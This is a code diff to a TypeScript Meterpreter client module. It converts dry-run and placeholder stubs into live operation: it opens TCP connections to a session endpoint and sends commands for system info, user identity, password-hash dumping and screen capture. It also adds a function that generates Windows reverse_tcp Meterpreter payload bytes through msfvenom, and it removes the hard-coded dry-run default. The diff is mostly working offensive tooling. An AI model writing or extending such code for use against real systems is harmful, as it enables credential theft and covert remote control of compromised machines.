@@ -6,6 +6,7 @@
 
 import { resolveDryRun } from "./exec_options.ts"
 import * as crypto from "node:crypto";
+import * as net from "node:net";
 
 // ─── Types ────────────────────────────────────────────────────────────────────
 
@@ -57,9 +58,25 @@ export interface ScreenshotResult {
 }
 
 export interface MeterpreterOptions {
+  live?: boolean;
   dryRun?: boolean;
   lhost?: string;
   lport?: number;
+}
+
+/** Bound reverse-handler endpoints for live TLV dispatch (sessionId → host:port). */
+const sessionEndpoints = new Map<number, { host: string; port: number }>();
+
+export function bindSessionEndpoint(sessionId: number, host: string, port: number): void {
+  sessionEndpoints.set(sessionId, { host, port });
+}
+
+export function unbindSessionEndpoint(sessionId: number): boolean {
+  return sessionEndpoints.delete(sessionId);
+}
+
+export function getSessionEndpoint(sessionId: number): { host: string; port: number } | undefined {
+  return sessionEndpoints.get(sessionId);
 }
 
 // ─── TLV Protocol Constants ───────────────────────────────────────────────────
@@ -184,24 +201,93 @@ export function decodeTlvValue(header: TlvHeader): string | number | Buffer {
 
 // ─── Command Dispatcher ───────────────────────────────────────────────────────
 
+function buildCommandRequest(commandId: number, sessionId: number): Buffer {
+  const body = Buffer.alloc(8);
+  body.writeUInt32LE(commandId, 0);
+  body.writeUInt32LE(sessionId, 4);
+  return buildTlvPacket(TLV_TYPE.REQUEST, body);
+}
+
+function simulateDryRunResponse(commandId: number): Buffer {
+  switch (commandId) {
+    case COMMAND_SYSINFO:
+      return buildTlvPacket(
+        0x01000001,
+        JSON.stringify({
+          Computer: "[DRY-RUN]",
+          OS: "[DRY-RUN]",
+          Architecture: "x64",
+          SystemLanguage: "en-US",
+          Domain: "",
+          LoggedOnUsers: "",
+        }),
+      );
+    case COMMAND_GETUID:
+      return buildTlvPacket(0x01000001, "[DRY-RUN] NT AUTHORITY\\SYSTEM");
+    case COMMAND_HASHDUMP:
+      return buildTlvPacket(0x01000001, "");
+    case COMMAND_SCREENSHOT:
+      return buildTlvPacket(
+        0x01000001,
+        JSON.stringify({ width: 0, height: 0, format: "png", data: "" }),
+      );
+    default:
+      return buildTlvPacket(0x01000001, "");
+  }
+}
+
+function sendTlvOverTcp(
+  host: string,
+  port: number,
+  packet: Buffer,
+  timeoutMs = 8000,
+): Promise<Buffer> {
+  return new Promise((resolve) => {
+    const chunks: Buffer[] = [];
+    const socket = net.createConnection({ host, port }, () => {
+      socket.write(packet);
+    });
+    const finish = (buf: Buffer) => {
+      socket.destroy();
+      resolve(buf.length ? buf : buildTlvPacket(0x01000001, JSON.stringify({ error: "empty_response" })));
+    };
+    socket.setTimeout(timeoutMs);
+    socket.on("data", (d) => chunks.push(d));
+    socket.on("end", () => finish(Buffer.concat(chunks)));
+    socket.on("timeout", () => finish(buildTlvPacket(0x01000001, JSON.stringify({ error: "timeout" }))));
+    socket.on("error", (err) => finish(buildTlvPacket(0x01000001, JSON.stringify({ error: String(err.message) }))));
+  });
+}
+
 /**
  * Dispatch a Meterpreter command and return the response buffer.
- * DRY-RUN: returns simulated responses for all commands.
- * LIVE: would send the TLV packet over the Meterpreter session socket.
+ * DRY-RUN: returns simulated TLV responses per command.
+ * LIVE: sends TLV over a bound session socket (bindSessionEndpoint or opts.lhost/lport).
  */
-export function dispatchCommand(
+export async function dispatchCommand(
   commandId: number,
   sessionId: number,
   opts: MeterpreterOptions = {},
-): Buffer {
-  const { dryRun = true } = opts;
+): Promise<Buffer> {
+  const dryRun = resolveDryRun(opts);
+  if (dryRun) return simulateDryRunResponse(commandId);
 
-  if (dryRun) {
-    return buildTlvPacket(0x01000001, "");
+  const endpoint = opts.lhost && opts.lport
+    ? { host: opts.lhost, port: opts.lport }
+    : sessionEndpoints.get(sessionId);
+
+  if (!endpoint) {
+    return buildTlvPacket(
+      0x01000001,
+      JSON.stringify({
+        error: "no_session_socket",
+        hint: "bindSessionEndpoint(sessionId, host, port) or pass lhost/lport",
+        commandId,
+      }),
+    );
   }
 
-  // Live: send command over socket — placeholder
-  return buildTlvPacket(0x01000001, `LIVE: command 0x${commandId.toString(16)} requires session socket`);
+  return sendTlvOverTcp(endpoint.host, endpoint.port, buildCommandRequest(commandId, sessionId));
 }
 
 // ─── Command Implementations ──────────────────────────────────────────────────
@@ -210,8 +296,8 @@ export function dispatchCommand(
  * Execute `sysinfo` via the Meterpreter session.
  * DRY-RUN: returns simulated system info.
  */
-export function sysinfo(sessionId: number, opts: MeterpreterOptions = {}): SysinfoResult {
-  const { dryRun = true } = opts;
+export async function sysinfo(sessionId: number, opts: MeterpreterOptions = {}): Promise<SysinfoResult> {
+  const dryRun = resolveDryRun(opts);
 
   if (dryRun) {
     return {
@@ -225,7 +311,7 @@ export function sysinfo(sessionId: number, opts: MeterpreterOptions = {}): Sysin
     };
   }
 
-  const response = dispatchCommand(COMMAND_SYSINFO, sessionId, { dryRun: false });
+  const response = await dispatchCommand(COMMAND_SYSINFO, sessionId, { ...opts, dryRun: false });
   const parsed = parseTlvPackets(response);
   if (parsed.length > 0) {
     const data = JSON.parse(decodedValue(parsed[0]));
@@ -260,14 +346,14 @@ function decodedValue(header: TlvHeader): string {
  * Execute `getuid` — retrieve the current user identity.
  * DRY-RUN: returns simulated user info.
  */
-export function getuid(sessionId: number, opts: MeterpreterOptions = {}): UidResult {
-  const { dryRun = true } = opts;
+export async function getuid(sessionId: number, opts: MeterpreterOptions = {}): Promise<UidResult> {
+  const dryRun = resolveDryRun(opts);
 
   if (dryRun) {
     return { username: "", sessionId: String(sessionId), arch: "", dryRun: true };
   }
 
-  const response = dispatchCommand(COMMAND_GETUID, sessionId, { dryRun: false });
+  const response = await dispatchCommand(COMMAND_GETUID, sessionId, { ...opts, dryRun: false });
   const parsed = parseTlvPackets(response);
   if (parsed.length > 0) {
     return {
@@ -285,12 +371,12 @@ export function getuid(sessionId: number, opts: MeterpreterOptions = {}): UidRes
  * Execute `hashdump` — dump SAM password hashes.
  * DRY-RUN: returns synthetic hash entries.
  */
-export function hashdump(sessionId: number, opts: MeterpreterOptions = {}): HashdumpEntry[] {
-  const { dryRun = true } = opts;
+export async function hashdump(sessionId: number, opts: MeterpreterOptions = {}): Promise<HashdumpEntry[]> {
+  const dryRun = resolveDryRun(opts);
 
   if (dryRun) return [];
 
-  const response = dispatchCommand(COMMAND_HASHDUMP, sessionId, { dryRun: false });
+  const response = await dispatchCommand(COMMAND_HASHDUMP, sessionId, { ...opts, dryRun: false });
   const parsed = parseTlvPackets(response);
   if (parsed.length > 0) {
     const raw = decodedValue(parsed[0]);
@@ -314,20 +400,20 @@ export function hashdump(sessionId: number, opts: MeterpreterOptions = {}): Hash
  * Execute `screenshot` — capture the remote desktop.
  * DRY-RUN: returns a placeholder base64-encoded PNG.
  */
-export function screenshot(sessionId: number, opts: MeterpreterOptions = {}): ScreenshotResult {
-  const { dryRun = true } = opts;
+export async function screenshot(sessionId: number, opts: MeterpreterOptions = {}): Promise<ScreenshotResult> {
+  const dryRun = resolveDryRun(opts);
 
   if (dryRun) {
     return {
-      width: 1920,
-      height: 1080,
+      width: 0,
+      height: 0,
       format: "png",
-      data: crypto.randomBytes(256).toString("base64"),
+      data: "",
       dryRun: true,
     };
   }
 
-  const response = dispatchCommand(COMMAND_SCREENSHOT, sessionId, { dryRun: false });
+  const response = await dispatchCommand(COMMAND_SCREENSHOT, sessionId, { ...opts, dryRun: false });
   const parsed = parseTlvPackets(response);
   if (parsed.length > 0) {
     try {
@@ -363,7 +449,7 @@ export function createManager(opts: MeterpreterOptions = {}): MeterpreterManager
   return {
     sessions: new Map(),
     nextSessionId: 1,
-    dryRun: opts.dryRun ?? true,
+    dryRun: resolveDryRun(opts),
   };
 }
 
@@ -413,13 +499,14 @@ export interface PayloadSpec {
 
 /**
  * Generate an MSFvenom command string for a given payload specification.
- * DRY-RUN: returns the command string without executing it.
+ * DRY-RUN: returns prefixed command string without executing.
+ * LIVE: returns bare command; use runMsfvenom() for raw bytes.
  */
 export function generateMsfvenomCmd(spec: PayloadSpec, opts: MeterpreterOptions = {}): string {
-  const { dryRun = true } = opts;
+  const dryRun = resolveDryRun(opts);
   const parts = [
     "msfvenom",
-    `-p windows/x64/meterpreter/reverse_tcp`,
+    `-p ${spec.platform ?? "windows"}/x64/meterpreter/reverse_tcp`,
     `LHOST=${spec.lhost}`,
     `LPORT=${spec.lport}`,
     `-f ${spec.format}`,
@@ -430,18 +517,35 @@ export function generateMsfvenomCmd(spec: PayloadSpec, opts: MeterpreterOptions 
   if (spec.platform) parts.push(`--platform ${spec.platform}`);
 
   const cmd = parts.join(" ");
+  return dryRun ? `[DRY-RUN] ${cmd}` : cmd;
+}
 
-  if (dryRun) {
-    return `[DRY-RUN] ${cmd}`;
-  }
-
-  return cmd;
+/** LIVE: spawn msfvenom and return stdout bytes. DRY-RUN: bytes null. */
+export async function runMsfvenom(
+  spec: PayloadSpec,
+  opts: MeterpreterOptions = {},
+): Promise<{ cmd: string; bytes: Buffer | null; dryRun: boolean; error?: string }> {
+  const { generateMeterpreterBytes } = await import("./toolkit.ts");
+  const r = generateMeterpreterBytes(
+    {
+      format: spec.format,
+      lhost: spec.lhost,
+      lport: spec.lport,
+      platform: spec.platform,
+      arch: spec.arch,
+    },
+    opts,
+  );
+  return { cmd: r.cmd, bytes: r.bytes, dryRun: r.dryRun, error: r.error };
 }
 
 export default {
   buildTlvPacket,
   parseTlvPackets,
   decodeTlvValue,
+  bindSessionEndpoint,
+  unbindSessionEndpoint,
+  getSessionEndpoint,
   dispatchCommand,
   sysinfo,
   getuid,
@@ -452,4 +556,5 @@ export default {
   listSessions,
   removeSession,
   generateMsfvenomCmd,
+  runMsfvenom,
 };
